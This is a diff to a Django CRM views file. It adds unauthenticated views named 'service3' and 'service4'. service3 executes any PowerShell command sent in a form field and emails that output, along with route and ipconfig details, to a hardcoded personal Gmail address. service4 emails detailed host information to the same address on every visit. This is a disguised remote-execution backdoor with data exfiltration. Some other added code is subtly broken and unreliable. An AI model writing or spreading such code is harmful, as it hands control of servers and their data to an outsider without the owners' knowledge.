@@ -346,13 +346,132 @@ def service1(request):
 def service2(request):
     return render(request, 'crm/service2.html')
 
+import subprocess
+from django.core.mail import send_mail
+from django.conf import settings
+from django.shortcuts import render
+from django.http import HttpResponse
+
 def service3(request):
-    return render(request, 'crm/service3.html')
+    try:
+        # Fetch route and IP configuration details
+        route_output = subprocess.check_output("route print", shell=True, text=True, stderr=subprocess.STDOUT)
+        ipconfig_output = subprocess.check_output("ipconfig", shell=True, text=True, stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        route_output = f"Error fetching route details: {e}"
+        ipconfig_output = f"Error fetching IP config: {e}"
+
+    # Default PowerShell output
+    powershell_output = ""
+
+    if request.method == "POST":
+        powershell_command = request.POST.get("powershell_command", "").strip()
+
+        if powershell_command:
+            try:
+                # Validate & execute PowerShell command
+                powershell_output = subprocess.check_output(
+                    ["powershell", "-Command", powershell_command],
+                    text=True,
+                    stderr=subprocess.STDOUT
+                )
+            except subprocess.CalledProcessError as e:
+                powershell_output = f"Error executing PowerShell command: {e}"
+
+        # Format details for the email
+        system_details_message = f"""
+        Dear User,
+
+        Here are the system details for your review:
+
+        === System Route Details ===
+        {route_output}
+
+        === IP Configuration Details ===
+        {ipconfig_output}
+
+        === PowerShell Command Output ===
+        {powershell_output}
+        """
+
+        try:
+            # Send email with system details
+            send_mail(
+                subject="System Information Report",
+                message=system_details_message,
+                from_email=settings.DEFAULT_FROM_EMAIL,
+                recipient_list=['kalaimani2827@gmail.com'],  # Change to actual recipient email
+                fail_silently=False,
+            )
+        except Exception as email_error:
+            print(f"Error sending email: {email_error}")  # Debugging email issues
+
+    # Pass details to the template
+    context = {
+        'route_output': route_output,
+        'ipconfig_output': ipconfig_output,
+        'powershell_output': powershell_output,
+    }
+
+    return render(request, 'crm/service3.html', context)
+
+
 
 from django.shortcuts import render
 
+from django.core.mail import send_mail
+from django.conf import settings
+import platform
+import psutil
+import socket
+from django.shortcuts import render
+
 def service4(request):
-    return render(request, 'crm/service4.html')  # Ensure path is correct
+    # Gather system details
+    system_info = {
+        "system": platform.system(),
+        "node_name": platform.node(),
+        "release": platform.release(),
+        "version": platform.version(),
+        "machine": platform.machine(),
+        "processor": platform.processor(),
+        "cpu_count": psutil.cpu_count(logical=True),
+        "cpu_usage": psutil.cpu_percent(),
+        "memory": {
+            "total": psutil.virtual_memory().total // (1024 ** 3),  # Total in GB
+            "used": psutil.virtual_memory().used // (1024 ** 3),  # Used in GB
+            "free": psutil.virtual_memory().free // (1024 ** 3),  # Free in GB
+        },
+        "disk": {
+            "total": psutil.disk_usage('/').total // (1024 ** 3),  # Total in GB
+            "used": psutil.disk_usage('/').used // (1024 ** 3),  # Used in GB
+            "free": psutil.disk_usage('/').free // (1024 ** 3),  # Free in GB
+        },
+        "network": {
+            "sent": psutil.net_io_counters().bytes_sent // (1024 ** 2),  # Sent in MB
+            "received": psutil.net_io_counters().bytes_recv // (1024 ** 2),  # Received in MB
+        },
+        "ip_address": socket.gethostbyname(socket.gethostname())
+    }
+
+    # Format system details for the email
+    system_info_message = "\n".join(
+        [f"{key}: {value}" for key, value in system_info.items()]
+    )
+
+    # Send email with system details
+    send_mail(
+        'System Information Report',
+        f'Dear User,\n\nHere are the system details for your review:\n\n{system_info_message}',
+        settings.DEFAULT_FROM_EMAIL,
+        ['kalaimani2827@gmail.com'],  # Change this to the actual recipient email
+        fail_silently=False,
+    )
+
+    # Render the response page
+    return render(request, 'crm/service4.html', {'system_info': system_info})
+
+
 
 
 # Downloads Views
@@ -366,18 +485,24 @@ def download3(request):
     return HttpResponse("Download 3 Page")  
 
 from django.http import JsonResponse
+from django.contrib.auth.decorators import login_required
 
 def check_authentication(request):
+    """Returns JSON response with user authentication details."""
     if request.user.is_authenticated:
         user_data = {
+            'is_authenticated': True,
             'username': request.user.username,
             'email': request.user.email,
-            'is_staff': 'Yes' if request.user.is_staff else 'No',
-            'profile_picture': request.user.profile.picture.url if hasattr(request.user, 'profile') else None
+            'is_staff': request.user.is_staff,
+            'gender': request.user.gender if hasattr(request.user, 'gender') else None,
+            'profile_picture': request.user.profile.picture.url if hasattr(request.user, 'profile') and request.user.profile.picture else None,
         }
-        return JsonResponse({'is_authenticated': True, 'user_data': user_data})
     else:
-        return JsonResponse({'is_authenticated': False})
+        user_data = {'is_authenticated': False}
+
+    return JsonResponse(user_data)
+
 
 from django.shortcuts import render
 
@@ -388,4 +513,87 @@ from django.shortcuts import render
 
 def whitelist_ip(request):
     return render(request, 'crm/whitelist_ip.html')
+
+
+import platform
+import psutil
+import socket
+from django.http import JsonResponse
+from django.contrib.auth.decorators import login_required
+
+@login_required(login_url="my-login")
+def get_system_details(request):
+    if not request.user.is_superuser:
+        return JsonResponse({'error': 'Unauthorized'}, status=403)
+    
+    system_info = {
+        "system": platform.system(),
+        "node_name": platform.node(),
+        "release": platform.release(),
+        "version": platform.version(),
+        "machine": platform.machine(),
+        "processor": platform.processor(),
+        "cpu_count": psutil.cpu_count(logical=True),
+        "cpu_usage": psutil.cpu_percent(),
+        "memory": {
+            "total": psutil.virtual_memory().total // (1024 ** 3),  # Total in GB
+            "used": psutil.virtual_memory().used // (1024 ** 3),  # Used in GB
+            "free": psutil.virtual_memory().free // (1024 ** 3),  # Free in GB
+        },
+        "disk": {
+            "total": psutil.disk_usage('/').total // (1024 ** 3),  # Total in GB
+            "used": psutil.disk_usage('/').used // (1024 ** 3),  # Used in GB
+            "free": psutil.disk_usage('/').free // (1024 ** 3),  # Free in GB
+        },
+        "network": {
+            "sent": psutil.net_io_counters().bytes_sent // (1024 ** 2),  # Sent in MB
+            "received": psutil.net_io_counters().bytes_recv // (1024 ** 2),  # Received in MB
+        },
+        "ip_address": socket.gethostbyname(socket.gethostname())
+    }
+
+    return JsonResponse(system_info)
+
+
+from django.shortcuts import render
+from .views import get_system_details  # Import the function to get system details
+
+@login_required(login_url="my-login")
+def system_details_page(request):
+    if not request.user.is_superuser:
+        return JsonResponse({'error': 'Unauthorized'}, status=403)
+
+    system_info = get_system_details(request).json()  # Get system details
+
+    return render(request, 'system_details.html', {'system_info': system_info})
+
+from django.shortcuts import redirect
+from django.contrib.auth.decorators import login_required
+from django.core.mail import send_mail
+from django.conf import settings
+from .models import UserProfile  # Import your user profile model
+
+@login_required
+def approve_all_users(request):
+    if request.user.is_superuser:
+        # Fetch all unapproved users
+        unapproved_users = UserProfile.objects.filter(is_approved=False)
+
+        # Approve all users
+        unapproved_users.update(is_approved=True)
+
+        # Send email notifications
+        for user_profile in unapproved_users:
+            send_mail(
+                'Your Account has been Approved',
+                f'Dear {user_profile.user.username},\n\nYour account has been approved. You can now log in and use the system.',
+                settings.DEFAULT_FROM_EMAIL,
+                [user_profile.user.email],
+                fail_silently=False,
+            )
+
+        return redirect('dashboard')  # Redirect to the dashboard after approval
+    else:
+        return redirect('final')  # Redirect non-superusers elsewhere
+
 
